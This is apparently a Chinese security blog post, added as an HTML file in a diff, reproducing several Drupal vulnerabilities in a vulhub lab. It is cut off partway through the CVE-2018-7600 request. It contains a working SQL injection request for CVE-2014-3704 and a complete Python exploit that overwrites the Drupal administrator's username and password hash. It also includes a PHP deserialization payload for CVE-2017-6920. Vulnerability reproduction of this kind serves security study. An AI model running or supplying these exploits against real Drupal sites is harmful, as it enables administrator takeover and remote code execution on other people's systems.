@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。截止2011年底，共有13,802位WEB专家参加了Drupal的开发工作；228个国家使用181种语言的729,791位网站设计工作者使用Drupal。著名案例包括：联合国、美国白宫、美国">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Drupal 2019年前的系列漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。截止2011年底，共有13,802位WEB专家参加了Drupal的开发工作；228个国家使用181种语言的729,791位网站设计工作者使用Drupal。著名案例包括：联合国、美国白宫、美国">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201124192434140.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130135646649.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130135754126.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130140148536.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130140221357.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130145620712.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130150000911.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130151519421.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130162325179.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130164147956.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130164759989.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130164743816.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130172257094.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130172307261.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130171025740.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130185053451.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201130185600912.png">
+<meta property="article:published_time" content="2020-11-24T07:54:34.000Z">
+<meta property="article:modified_time" content="2020-11-24T07:54:34.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="Drupal">
+<meta property="article:tag" content="CVE-2014-3704">
+<meta property="article:tag" content="CVE-2017-6920">
+<meta property="article:tag" content="CVE-2018-7600">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20201124192434140.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Drupal 2019年前的系列漏洞复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/11/23/Confluence-CVE-2019-3396%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Drupal 2019年前的系列漏洞复现&body=Check out this article: http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=Drupal 2019年前的系列漏洞复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/11/24/Drupal-2019%E5%B9%B4%E5%89%8D%E7%9A%84%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=Drupal 2019年前的系列漏洞复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2014-3704-SQL注入漏洞"><span class="toc-number">1.</span> <span class="toc-text">CVE-2014-3704 SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc"><span class="toc-number">1.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-重置管理员用户为指定用户信息"><span class="toc-number">1.2.</span> <span class="toc-text">EXP -重置管理员用户为指定用户信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-6920-Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞"><span class="toc-number">2.</span> <span class="toc-text">CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC："><span class="toc-number">2.1.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-7600-Drupal-Drupalgeddon-2-远程代码执行"><span class="toc-number">3.</span> <span class="toc-text">CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC：-1"><span class="toc-number">3.1.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-7602-远程代码执行"><span class="toc-number">4.</span> <span class="toc-text">CVE-2018-7602 远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC：-2"><span class="toc-number">4.1.</span> <span class="toc-text">POC：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-6339-远程代码执行"><span class="toc-number">5.</span> <span class="toc-text">CVE-2019-6339 远程代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-6341-XSS"><span class="toc-number">6.</span> <span class="toc-text">CVE-2019-6341 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">6.1.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Drupal 2019年前的系列漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-24T07:54:34.000Z" itemprop="datePublished">2020-11-24</time>
+        
+        (Updated: <time datetime="2020-11-24T07:54:34.000Z" itemprop="dateModified">2020-11-24</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Drupal/">Drupal</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CVE-2014-3704/" rel="tag">CVE-2014-3704</a>, <a class="tag-link" href="/tags/CVE-2017-6920/" rel="tag">CVE-2017-6920</a>, <a class="tag-link" href="/tags/CVE-2018-7600/" rel="tag">CVE-2018-7600</a>, <a class="tag-link" href="/tags/Drupal/" rel="tag">Drupal</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a href="https://baike.baidu.com/item/内容管理系统/2683135" target="_blank" rel="noopener">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。截止2011年底，共有13,802位WEB专家参加了Drupal的开发工作；228个国家使用181种语言的729,791位网站设计工作者使用Drupal。著名案例包括：联合国、美国白宫、<a href="https://baike.baidu.com/item/美国商务部/3953268" target="_blank" rel="noopener">美国商务部</a>、<a href="https://baike.baidu.com/item/纽约时报/1049617" target="_blank" rel="noopener">纽约时报</a>、<a href="https://baike.baidu.com/item/华纳/777067" target="_blank" rel="noopener">华纳</a>、<a href="https://baike.baidu.com/item/迪斯尼/336959" target="_blank" rel="noopener">迪斯尼</a>、<a href="https://baike.baidu.com/item/联邦快递/4759000" target="_blank" rel="noopener">联邦快递</a>、索尼、美国哈佛大学、Ubuntu等。</p>
+</blockquote>
+<p>以下漏洞的复现环境都是vulhub</p>
+<h3 id="CVE-2014-3704-SQL注入漏洞"><a href="#CVE-2014-3704-SQL注入漏洞" class="headerlink" title="CVE-2014-3704 SQL注入漏洞"></a>CVE-2014-3704 SQL注入漏洞</h3><blockquote>
+<p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。</p>
+</blockquote>
+<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?q=node&amp;destination=node</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ip:port</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20201124192434140.png" alt="image-20201124192434140"></p>
+<h4 id="EXP-重置管理员用户为指定用户信息"><a href="#EXP-重置管理员用户为指定用户信息" class="headerlink" title="EXP -重置管理员用户为指定用户信息"></a>EXP -重置管理员用户为指定用户信息</h4><p>依赖脚本drupalpass：<a href="https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py" target="_blank" rel="noopener">https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2,sys</span><br><span class="line"><span class="keyword">from</span> drupalpass <span class="keyword">import</span> DrupalHash </span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">user = sys.argv[<span class="number">2</span>]</span><br><span class="line">password = sys.argv[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"host username password"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"http://nope.io admin wowsecure"</span></span><br><span class="line">hash = DrupalHash(<span class="string">"$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML"</span>, password).get_hash()</span><br><span class="line">target = <span class="string">'%s/?q=node&amp;destination=node'</span> % host</span><br><span class="line">post_data = <span class="string">"name[0%20;update+users+set+name%3d\'"</span> \</span><br><span class="line">            +user \</span><br><span class="line">            +<span class="string">"'+,+pass+%3d+'"</span> \</span><br><span class="line">            +hash[:<span class="number">55</span>] \</span><br><span class="line">            +<span class="string">"'+where+uid+%3d+\'1\';;#%20%20]=bob&amp;name[0]=larry&amp;pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in"</span></span><br><span class="line">content = urllib2.urlopen(url=target, data=post_data).read()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"mb_strlen() expects parameter 1"</span> <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Success!\nLogin now with user:%s and pass:%s"</span> % (user, password)</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate a non-truncated Drupal 7 compatible password hash.</span></span><br><span class="line"><span class="comment"># The consumer of these hashes must truncate correctly.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DrupalHash</span>:</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, stored_hash, password)</span>:</span></span><br><span class="line">    self.itoa64 = <span class="string">'./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    self.last_hash = self.rehash(stored_hash, password)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_hash</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.last_hash</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">password_get_count_log2</span><span class="params">(self, setting)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.itoa64.index(setting[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">password_crypt</span><span class="params">(self, algo, password, setting)</span>:</span></span><br><span class="line">    setting = setting[<span class="number">0</span>:<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">if</span> setting[<span class="number">0</span>] != <span class="string">'$'</span> <span class="keyword">or</span> setting[<span class="number">2</span>] != <span class="string">'$'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    count_log2 = self.password_get_count_log2(setting)</span><br><span class="line">    salt = setting[<span class="number">4</span>:<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">if</span> len(salt) &lt; <span class="number">8</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    count = <span class="number">1</span> &lt;&lt; count_log2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> algo == <span class="string">'md5'</span>:</span><br><span class="line">      hash_func = hashlib.md5</span><br><span class="line">    <span class="keyword">elif</span> algo == <span class="string">'sha512'</span>:</span><br><span class="line">      hash_func = hashlib.sha512</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    hash_str = hash_func(salt + password).digest()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(count):</span><br><span class="line">      hash_str = hash_func(hash_str + password).digest()</span><br><span class="line">    output = setting + self.custom64(hash_str)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">custom64</span><span class="params">(self, string, count = <span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">      count = len(string)</span><br><span class="line">    output = <span class="string">''</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    itoa64 = self.itoa64</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">      value = ord(string[i])</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      output += itoa64[value &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &lt; count:</span><br><span class="line">        value |= ord(string[i]) &lt;&lt; <span class="number">8</span></span><br><span class="line">      output += itoa64[(value &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &gt;= count:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span> i &lt; count:</span><br><span class="line">        value |= ord(string[i]) &lt;&lt; <span class="number">16</span></span><br><span class="line">      output += itoa64[(value &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &gt;= count:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      output += itoa64[(value &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>]</span><br><span class="line">      <span class="keyword">if</span> i &gt;= count:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">rehash</span><span class="params">(self, stored_hash, password)</span>:</span></span><br><span class="line">    <span class="comment"># Drupal 6 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> len(stored_hash) == <span class="number">32</span> <span class="keyword">and</span> stored_hash.find(<span class="string">'$'</span>) == <span class="number">-1</span>:</span><br><span class="line">      <span class="keyword">return</span> hashlib.md5(password).hexdigest()</span><br><span class="line">      <span class="comment"># Drupal 7</span></span><br><span class="line">    <span class="keyword">if</span> stored_hash[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'U$'</span>:</span><br><span class="line">      stored_hash = stored_hash[<span class="number">1</span>:]</span><br><span class="line">      password = hashlib.md5(password).hexdigest()</span><br><span class="line">    hash_type = stored_hash[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> hash_type == <span class="string">'$S$'</span>:</span><br><span class="line">      hash_str = self.password_crypt(<span class="string">'sha512'</span>, password, stored_hash)</span><br><span class="line">    <span class="keyword">elif</span> hash_type == <span class="string">'$H$'</span> <span class="keyword">or</span> hash_type == <span class="string">'$P$'</span>:</span><br><span class="line">      hash_str = self.password_crypt(<span class="string">'md5'</span>, password, stored_hash)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      hash_str = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> hash_str</span><br></pre></td></tr></table></figure>
+
+<p>使用上述脚本进行测试，尝试添加管理员用户abc/123123：</p>
+<p><img src="/imgs/image-20201130135646649.png" alt="image-20201130135646649"></p>
+<p>然后用abc/123123登录成功：</p>
+<p><img src="/imgs/image-20201130135754126.png" alt="image-20201130135754126"></p>
+<p>进入mysql容器：</p>
+<p><img src="/imgs/image-20201130140148536.png" alt="image-20201130140148536"></p>
+<p>查看到admin被替换：</p>
+<p><img src="/imgs/image-20201130140221357.png" alt="image-20201130140221357"></p>
+<p>参考链接：<a href="https://www.freebuf.com/vuls/47690.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/47690.html</a></p>
+<h3 id="CVE-2017-6920-Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞"><a href="#CVE-2017-6920-Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞" class="headerlink" title="CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞"></a>CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞</h3><p><strong>利用条件：需要管理员帐号密码</strong></p>
+<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!php&#x2F;object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>步骤：</p>
+<p>1、登录管理员</p>
+<p>2、访问：<a href="http://192.168.116.132/admin/config/development/configuration/single/import" target="_blank" rel="noopener">http://192.168.116.132/admin/config/development/configuration/single/import</a></p>
+<p>3、<code>Configuration type</code> 选择 <code>Simple configuration</code>，<code>Configuration name</code> 任意填写，<code>Paste your configuration here</code> 中填写POC</p>
+<p><img src="/imgs/image-20201130145620712.png" alt="image-20201130145620712"></p>
+<p><img src="/imgs/image-20201130150000911.png" alt="image-20201130150000911"></p>
+<h3 id="CVE-2018-7600-Drupal-Drupalgeddon-2-远程代码执行"><a href="#CVE-2018-7600-Drupal-Drupalgeddon-2-远程代码执行" class="headerlink" title="CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行"></a>CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行</h3><h4 id="POC：-1"><a href="#POC：-1" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: 